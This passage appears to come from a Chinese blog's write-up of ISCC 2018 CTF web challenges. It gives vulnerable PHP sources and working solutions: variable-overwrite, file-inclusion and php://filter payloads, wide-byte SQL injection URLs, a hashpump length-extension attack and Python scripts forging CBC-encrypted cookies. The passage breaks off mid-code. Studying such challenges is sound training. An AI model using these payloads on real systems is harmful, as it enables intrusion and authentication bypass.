title="一切都是套路"></a>一切都是套路</h3><p>hit:好像有个文件忘记删了</p><p>打开index.php.txt</p><p>发现</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line">if ($_SERVER[&quot;REQUEST_METHOD&quot;] != &quot;POST&quot;)</span><br><span class="line">die(&quot;flag is here&quot;);</span><br><span class="line">if (!isset($_POST[&quot;flag&quot;]) )</span><br><span class="line">die($_403);</span><br><span class="line">foreach ($_GET as $k =&gt; $v)&#123;</span><br><span class="line">$$k = $$v;</span><br><span class="line">&#125;</span><br><span class="line">foreach ($_POST as $k =&gt; $v)&#123;</span><br><span class="line">$$k = $v;</span><br><span class="line">&#125;</span><br><span class="line">if ( $_POST[&quot;flag&quot;] !== $flag )</span><br><span class="line">die($_403);</span><br><span class="line">echo &quot;flag: &quot;. $flag . &quot;\n&quot;;</span><br><span class="line">die($_200);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>需要满足3个if才能得到flag，这是个<code>$$</code>导致的变量覆盖问题。题目中使用了两个foreach并且也使用了<code>$$</code>，两个foreach中对<code>$$k</code>的处理是不一样的，满足条件后会将<code>$flag</code>里面的值打印出来。</p><p>但由于第5与第13-14行的代码会将<code>$flag</code>的值给覆盖掉了，所以需要先将<code>$flag</code>的值赋给<code>$_200</code>或<code>$_403</code>，然后利用<code>die($_200)</code>或 <code>die($_403)</code>将flag打印出来。</p><p><img src="/image/ISCC-2018/Web3.png" alt=""></p><h3 id="你能绕过吗"><a href="#你能绕过吗" class="headerlink" title="你能绕过吗?"></a>你能绕过吗?</h3><p>hit:没过滤好啊</p><p>这个题目，最开始以为是注入题，毕竟这个题目这个显示。</p><p><img src="/image/ISCC-2018/Web4.png" alt=""></p><p>尝试了<code>id</code>的注入点，最后在尝试修改<code>f参数</code>为<code>index.php</code>，发现带有php参数的显示了 <code>error...</code>，最后的尝试</p><p><img src="/image/ISCC-2018/Web4-1.png" alt=""></p><p><code>index.php</code>的源码为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    #ISCC&#123;LFIOOOOOOOOOOOOOO&#125;</span><br><span class="line">    if(isset($_GET[&apos;f&apos;]))&#123;</span><br><span class="line">        if(strpos($_GET[&apos;f&apos;],&quot;php&quot;) !== False)&#123;</span><br><span class="line">            die(&quot;error...&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            include($_GET[&apos;f&apos;] . &apos;.php&apos;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>原来如此，怪不得带有php的都报错了。</p><h3 id="web02"><a href="#web02" class="headerlink" title="web02"></a>web02</h3><p>打开链接显示</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">错误！你的IP不是本机ip！</span><br></pre></td></tr></table></figure><p>应该就是伪造IP了。尝试各种伪造IP的http头</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For</span><br><span class="line">Client-IP</span><br><span class="line">x-remote-IP</span><br><span class="line">x-originating-IP</span><br><span class="line">x-remote-addr</span><br></pre></td></tr></table></figure><p><img src="/image/ISCC-2018/Web5.png" alt=""></p><h3 id="本地的诱惑"><a href="#本地的诱惑" class="headerlink" title="本地的诱惑"></a>本地的诱惑</h3><p>题目：小明扫描了他心爱的小红的电脑，发现开放了一个8013端口，但是当小明去访问的时候却发现只允许从本地访问，可他心爱的小红不敢让这个诡异的小明触碰她的电脑，可小明真的想知道小红电脑的8013端口到底隐藏着什么秘密(key)？（签到题）</p><p>右键源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">//print_r($_SERVER);</span><br><span class="line">$arr=explode(&apos;,&apos;,$_SERVER[&apos;HTTP_X_FORWARDED_FOR&apos;]);</span><br><span class="line">if($arr[0]==&apos;127.0.0.1&apos;)&#123;</span><br><span class="line">    //key</span><br><span class="line">    echo &quot;key is ISCC&#123;^&amp;*(UIHKJjkadshf&#125;&quot;;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">echo &quot;必须从本地访问！&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">//SAE 服务调整,该题目无法继续...可尝试自行搭建环境测试.</span><br><span class="line">echo file_get_contents(__FILE__);</span><br></pre></td></tr></table></figure><h3 id="Please-give-me-username-and-password"><a href="#Please-give-me-username-and-password" class="headerlink" title="Please give me username and password!"></a>Please give me username and password!</h3><p>访问<code>index.php.txt</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$flag = &quot;***********&quot;;</span><br><span class="line">if(isset($_GET[&apos;username&apos;]))&#123;</span><br><span class="line">if (0 == strcasecmp($flag,$_GET[&apos;username&apos;]))&#123;</span><br><span class="line">$a = fla;</span><br><span class="line">echo &quot;very good!Username is right&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">print &apos;Username is not right&lt;!--index.php.txt--&gt;&apos;;&#125;</span><br><span class="line">&#125;else</span><br><span class="line">print &apos;Please give me username or password!&apos;;</span><br><span class="line">if (isset($_GET[&apos;password&apos;]))&#123;</span><br><span class="line">if (is_numeric($_GET[&apos;password&apos;]))&#123;</span><br><span class="line">if (strlen($_GET[&apos;password&apos;]) &lt; 4)&#123;</span><br><span class="line">if ($_GET[&apos;password&apos;] &gt; 999)&#123;</span><br><span class="line">$b = g;</span><br><span class="line">print &apos;&lt;p&gt;very good!Password is right&lt;/p&gt;&apos;;</span><br><span class="line">&#125;else </span><br><span class="line">print &apos;&lt;p&gt;Password too little&lt;/p&gt;&apos;;</span><br><span class="line">&#125;else</span><br><span class="line">print &apos;&lt;p&gt;Password too long&lt;/p&gt;&apos;;</span><br><span class="line">&#125;else</span><br><span class="line">print &apos;&lt;p&gt;Password is not numeric&lt;/p&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">if ($a.$b == &quot;flag&quot;)</span><br><span class="line">print $flag;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>绕过即可<code>username[]=&amp;password=9e9</code></p><h3 id="试试看"><a href="#试试看" class="headerlink" title="试试看"></a>试试看</h3><p>题目：随意开火</p><p>查看图片，观察URL为<code>/show.php?img=1.jpg</code>。已经没有别的页面了，估计就是文件读取</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?img=php://filter/read=convert.base64-encode/resource=1.jpg # 正常访问</span><br><span class="line">?img=php://filter/read=convert.base64-encode/resource=show.php # File not found.</span><br><span class="line">不正常。。。。</span><br><span class="line">?img=php://filter/read=convert.base64-encode/resource=1.jpg=php://filter/read=convert.base64-encode/resource=1.jpg # 正常访问</span><br><span class="line">?img=php://filter/read=convert.base64-encode/resource=1.jpg=php://filter/read=convert.base64-encode/resource=show.php # 正常访问</span><br></pre></td></tr></table></figure><p>有戏，右键查看源码，发现已经能读到PHP源码了，接下来就是直接找flag所在，最后在<code>../flag.php</code>找到flag</p><h3 id="请ping我的ip-看你能Ping通吗？"><a href="#请ping我的ip-看你能Ping通吗？" class="headerlink" title="请ping我的ip 看你能Ping通吗？"></a>请ping我的ip 看你能Ping通吗？</h3><p>题目：我都过滤了，看你怎么绕。</p><p>题目地址：<a href="http://118.190.152.202:8018/" target="_blank" rel="noopener">http://118.190.152.202:8018</a></p><p>直接访问<a href="http://118.190.152.202:8018/flag.txt" target="_blank" rel="noopener">http://118.190.152.202:8018/flag.txt</a>  就出现flag了。</p><p>正确解法是</p><p><img src="/image/ISCC-2018/Web9.png" alt=""></p><h3 id="SQL注入的艺术"><a href="#SQL注入的艺术" class="headerlink" title="SQL注入的艺术"></a>SQL注入的艺术</h3><p>扫描扫到<code>/admins</code>，访问直接下载，打开发现是数据库链接信息，内部含有flag。</p><p>正确解法：宽字节注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://118.190.152.202:8015/index.php?id=1%df%27</span><br><span class="line">http://118.190.152.202:8015/index.php?id=1%df%27%20and%201=1%20--+</span><br></pre></td></tr></table></figure><p><img src="/image/ISCC-2018/Web10.png" alt=""></p><h3 id="web01"><a href="#web01" class="headerlink" title="web01"></a>web01</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">highlight_file(&apos;2.php&apos;); </span><br><span class="line">$flag=&apos;&#123;***************&#125;&apos;; </span><br><span class="line">if (isset($_GET[&apos;password&apos;])) &#123;   </span><br><span class="line">    if (strcmp($_GET[&apos;password&apos;], $flag) == 0)   </span><br><span class="line">        die(&apos;Flag: &apos;.$flag);   </span><br><span class="line">    else   </span><br><span class="line">        print &apos;Invalid password&apos;;   </span><br><span class="line">&#125;   </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>想都不想，直接<code>/password[]=flag</code></p><h3 id="Collide"><a href="#Collide" class="headerlink" title="Collide"></a>Collide</h3><p>题目：那么长的秘钥，要爆破到什么时候啊</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;secret.php&quot;;</span><br><span class="line">@$username=(string)$_POST[&apos;username&apos;];</span><br><span class="line">function enc($text)&#123;</span><br><span class="line">    global $key;</span><br><span class="line">    return md5($key.$text);</span><br><span class="line">&#125;</span><br><span class="line">if(enc($username) === $_COOKIE[&apos;verify&apos;])&#123;</span><br><span class="line">    if(is_numeric(strpos($username, &quot;admin&quot;)))&#123;</span><br><span class="line">        die($flag);</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        die(&quot;you are not admin&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    setcookie(&quot;verify&quot;, enc(&quot;guest&quot;), time()+60*60*24*7);</span><br><span class="line">    setcookie(&quot;len&quot;, strlen($key), time()+60*60*24*7);</span><br><span class="line">&#125;</span><br><span class="line">show_source(__FILE__);</span><br></pre></td></tr></table></figure><p>hash长度扩展攻击</p><ul><li><code>$key</code>变量我们是不知道的，但是从<code>len</code>值中能获取到长度为<code>46</code></li><li>从<code>verify</code>中得到<code>md5($key.guest)</code>的值为：<code>78cfc57d983b4a17e55828c001a3e781</code></li><li>成功登陆条件：<code>username=guestxxxxxxxxadmin</code>，并且<code>verify</code>要等于<code>md5($key.uaername)</code></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">hashpump -s 78cfc57d983b4a17e55828c001a3e781 -d guest -k 46 -a admin</span><br><span class="line">得出</span><br><span class="line">5f585093a7fe86971766c3d25c43d0eb</span><br><span class="line">guets\x80\x00\x00\x00\x00\x98\x01\x00\x00\x00\x00\x00\x00admin</span><br><span class="line">处理</span><br><span class="line">guest%80%00%00%00%00%98%01%00%00%00%00%00%00admin</span><br></pre></td></tr></table></figure><p>这个提交得看脸。</p><p>ISCC{MD5_1s_n0t_5afe}</p><h3 id="Only-admin-can-see-flag"><a href="#Only-admin-can-see-flag" class="headerlink" title="Only admin can see flag"></a>Only admin can see flag</h3><p>查看源码发现提示<code>index.txt</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &apos;sqlwaf.php&apos;;</span><br><span class="line">define(&quot;SECRET_KEY&quot;, &quot;................&quot;);</span><br><span class="line">define(&quot;METHOD&quot;, &quot;aes-128-cbc&quot;);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">function get_random_iv()&#123;</span><br><span class="line">    $iv=&apos;&apos;;</span><br><span class="line">    for($i=0;$i&lt;16;$i++)&#123;</span><br><span class="line">        $iv.=chr(rand(1,255));</span><br><span class="line">    &#125;</span><br><span class="line">    return $iv;</span><br><span class="line">&#125;</span><br><span class="line">function login($info)&#123;</span><br><span class="line">    $iv=get_random_iv();</span><br><span class="line">    $plain = serialize($info);</span><br><span class="line">    $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);</span><br><span class="line">    $_SESSION[&apos;username&apos;] = $info[&apos;username&apos;];</span><br><span class="line">    setcookie(&quot;iv&quot;, base64_encode($iv));</span><br><span class="line">    setcookie(&quot;cipher&quot;, base64_encode($cipher));</span><br><span class="line">&#125;</span><br><span class="line">function show_homepage()&#123;</span><br><span class="line">    if ($_SESSION[&quot;username&quot;]===&apos;admin&apos;)&#123;</span><br><span class="line">        echo &apos;&lt;p&gt;Hello admin&lt;/p&gt;&apos;;</span><br><span class="line">        echo &apos;&lt;p&gt;Flag is *************&lt;/p&gt;&apos;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &apos;&lt;p&gt;hello &apos;.$_SESSION[&apos;username&apos;].&apos;&lt;/p&gt;&apos;;</span><br><span class="line">        echo &apos;&lt;p&gt;Only admin can see flag&lt;/p&gt;&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">    echo &apos;&lt;p&gt;&lt;a href=&quot;loginout.php&quot;&gt;Log out&lt;/a&gt;&lt;/p&gt;&apos;;</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line">function check_login()&#123;</span><br><span class="line">    if(isset($_COOKIE[&apos;cipher&apos;]) &amp;&amp; isset($_COOKIE[&apos;iv&apos;]))&#123;</span><br><span class="line">        $cipher = base64_decode($_COOKIE[&apos;cipher&apos;]);</span><br><span class="line">        $iv = base64_decode($_COOKIE[&quot;iv&quot;]);</span><br><span class="line">        if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv))&#123;</span><br><span class="line">            $info = unserialize($plain) or die(&quot;&lt;p&gt;base64_decode(&apos;&quot;.base64_encode($plain).&quot;&apos;) can&apos;t unserialize&lt;/p&gt;&quot;);</span><br><span class="line">            $_SESSION[&apos;username&apos;] = $info[&apos;username&apos;];</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            die(&quot;ERROR!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset($_POST[&apos;username&apos;])&amp;&amp;isset($_POST[&apos;password&apos;])) &#123;</span><br><span class="line">  $username=waf((string)$_POST[&apos;username&apos;]);</span><br><span class="line">  $password=waf((string)$_POST[&apos;password&apos;]);</span><br><span class="line">  if($username === &apos;admin&apos;)&#123;</span><br><span class="line">        exit(&apos;&lt;p&gt;You are not real admin!&lt;/p&gt;&apos;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $info = array(&apos;username&apos;=&gt;$username,&apos;password&apos;=&gt;$password);</span><br><span class="line">        login($info);</span><br><span class="line">        show_homepage();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">  if(isset($_SESSION[&quot;username&quot;]))&#123;</span><br><span class="line">        check_login();</span><br><span class="line">        show_homepage();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><a href="https://www.rawidn.com/posts/CBC-Byte-Flipping-Attack.html" target="_blank" rel="noopener">CBC字节反转攻击</a>攻击题目，先将输入的账号密码序列化，也就是获取<code>$plain</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$username = &apos;Admin&apos;;</span><br><span class="line">$password = &apos;RcoIl&apos;;</span><br><span class="line">$info = array(&apos;username&apos;=&gt;$username,&apos;password&apos;=&gt;$password);</span><br><span class="line">$plain = serialize($info);</span><br><span class="line">echo $plain;</span><br><span class="line">?&gt;</span><br><span class="line">运算结果：</span><br><span class="line">a:2:&#123;s:8:&quot;username&quot;;s:5:&quot;Admin&quot;;s:8:&quot;password&quot;;s:5:&quot;RcoIl&quot;;&#125;</span><br></pre></td></tr></table></figure><p>我们的目的就是将<code>Admin</code>中的<code>A</code>转换成<code>a</code>，接下来就是把明文分成16个字节的块（因为<code>AES-128</code>以128位为一块,正好16字节）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a:2:&#123;s:8:&quot;userna</span><br><span class="line">me&quot;;s:5:&quot;Admin&quot;;</span><br><span class="line">s:8:&quot;password&quot;;s</span><br><span class="line">:5:&quot;RcoIl&quot;;&#125;</span><br></pre></td></tr></table></figure><p>我们目标字符位于块2，这意味这我们需要改变块1的密文来改变第二块的密文。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">#! -*- coding:utf-8 -*-</span><br><span class="line">__author__=&apos;RcoIl&apos;</span><br><span class="line">import base64 </span><br><span class="line">import requests</span><br><span class="line">import urllib</span><br><span class="line">from urllib import unquote</span><br><span class="line"></span><br><span class="line">url = &apos;http://118.190.152.202:8001/&apos;</span><br><span class="line">data = &#123;</span><br><span class="line">    &apos;username&apos;: &apos;Admin&apos;,</span><br><span class="line">    &apos;password&apos;: &apos;12345&apos;,</span><br><span class="line">&#125;</span><br><span class="line">def Cookie(): </span><br><span class="line">    s = requests.Session()</span><br><span class="line">    cookies = s.post(url,data=data).cookies</span><br><span class="line">    cipher = base64.b64decode(unquote(cookies[&apos;cipher&apos;]))</span><br><span class="line">    cipher = cipher[:9] +  chr(ord(cipher[9]) ^ ord(&apos;A&apos;) ^ ord(&apos;a&apos;)) + cipher[10:]</span><br><span class="line">    Cookie = &quot;PHPSESSID=&quot;+urllib.unquote(cookies[&apos;PHPSESSID&apos;])+&apos;; &apos;+&quot;iv=&quot; + urllib.unquote(cookies[&apos;iv&apos;])+&apos;; &apos;+&quot;cipher=&quot; + urllib.quote(base64.b64encode(cipher))</span><br><span class="line"></span><br><span class="line">    header = &#123;</span><br><span class="line">        &quot;Cookie&quot;: Cookie</span><br><span class="line">    &#125;</span><br><span class="line">    try:</span><br><span class="line">        request = requests.post(url , headers = header)     </span><br><span class="line">    except Exception as e:</span><br><span class="line">        print e</span><br><span class="line">    else:</span><br><span class="line">        print request.text[18:][:-24]</span><br><span class="line">        print Cookie</span><br><span class="line">            </span><br><span class="line">Cookie()   </span><br><span class="line">运行结果：</span><br><span class="line">C/6oiLKm49k5g+Zw0sS8VW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6IjEyMzQ1Ijt9</span><br><span class="line">PHPSESSID=s3ikg88gets6adghmksalc2ld6; iv=w8wkcnN//ERbrLkywW37hA==; cipher=7dpnbYnc5gErczAwWeSYjWwDq8NfL83hd%2B0ZqcZMrZ/TA2i7QVfndD6GNQV/wDhzOW0x3vij5aEuOsEwuCIzGg%3D%3D</span><br><span class="line">查看unserialize的内容</span><br><span class="line">þ¨²¦ãÙ9æpÒÄ¼Ume&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:5:&quot;12345&quot;;&#125;,已成功改成admin</span><br></pre></td></tr></table></figure><p>但是第一块的内容显示不出来，接下来就是获取新的iv值及flag的获取。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">#! -*- coding:utf-8 -*-</span><br><span class="line">__author__=&apos;RcoIl&apos;</span><br><span class="line">import base64</span><br><span class="line">import urllib</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &apos;http://118.190.152.202:8001/&apos;</span><br><span class="line">iv = base64.b64decode(&quot;w8wkcnN//ERbrLkywW37hA==&quot;)</span><br><span class="line">plain = base64.b64decode(&quot;C/6oiLKm49k5g+Zw0sS8VW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6IjEyMzQ1Ijt9&quot;)</span><br><span class="line">want = &apos;a:2:&#123;s:8:&quot;userna&apos;</span><br><span class="line">newiv = &apos;&apos;</span><br><span class="line">for i in range(16):</span><br><span class="line">    newiv += chr(ord(plain[i]) ^ ord(iv[i]) ^ ord(want[i]))</span><br><span class="line">iv = urllib.quote(base64.b64encode(newiv)) # qQi%2BwLqqJaVYDSoxdtspsA%3D%3D</span><br><span class="line">cookie = &quot;PHPSESSID=s3ikg88gets6adghmksalc2ld6; iv=&quot;+ iv +&quot;; cipher=7dpnbYnc5gErczAwWeSYjWwDq8NfL83hd%2B0ZqcZMrZ/TA2i7QVfndD6GNQV/wDhzOW0x3vij5aEuOsEwuCIzGg%3D%3D&quot;</span><br><span class="line">header = &#123;</span><br><span class="line">        &quot;Cookie&quot;: cookie</span><br><span class="line">    &#125;</span><br><span class="line">try:</span><br><span class="line">    request = requests.post(url , headers = header)     </span><br><span class="line">except Exception as e:</span><br><span class="line">    print e</span><br><span class="line">else:</span><br><span class="line">    print request.text</span><br></pre></td></tr></table></figure><p>替换提交即可登陆真正的<code>admin</code>用户。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;p&gt;Hello admin&lt;/p&gt;&lt;p&gt;Flag is ISCC&#123;123dasd89as10aas&#125;&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;loginout.php&quot;&gt;Log out&lt;/a&gt;&lt;/p&gt;</span><br></pre></td></tr></table></figure><h3 id="php是世界上最好的语言"><a href="#php是世界上最好的语言" class="headerlink" title="php是世界上最好的语言"></a>php是世界上最好的语言</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt; </span><br><span class="line">&lt;body&gt; </span><br><span class="line">&lt;form action=&quot;md5.php&quot;  method=&quot;post&quot; &gt; </span><br><span class="line">    用户名:&lt;input type=&quot;text&quot; name=&quot;username&quot;/&gt; </span><br><span class="line">    密码:&lt;input type=&quot;password&quot; name =&quot;password&quot;/&gt; </span><br><span class="line">    &lt;input type=&quot;submit&quot; &gt; </span><br><span class="line">&lt;/body&gt; </span><br><span class="line">&lt;/html&gt; </span><br><span class="line">&lt;?php </span><br><span class="line">header(&quot;content-type:text/html;charset=utf-8&quot;); </span><br><span class="line">if(isset($_POST[&apos;username&apos;])&amp;isset($_POST[&apos;password&apos;]))&#123; </span><br><span class="line">    $username = $_POST[&apos;username&apos;]; </span><br><span class="line">    $password = $_POST[&apos;password&apos;]; </span><br><span class="line">&#125; </span><br><span class="line">else&#123; </span><br><span class="line">    $username=&quot;hello&quot;; </span><br><span class="line">    $password=&quot;hello&quot;; </span><br><span class="line">&#125; </span><br><span class="line">if(md5($password) == 0)&#123; </span><br><span class="line">    echo &quot;xxxxx&quot;; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">show_source(__FILE__); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>看到第19行，明显的弱类型绕过。密码填写<code>240610708</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">include &apos;flag.php&apos;; </span><br><span class="line">$a = 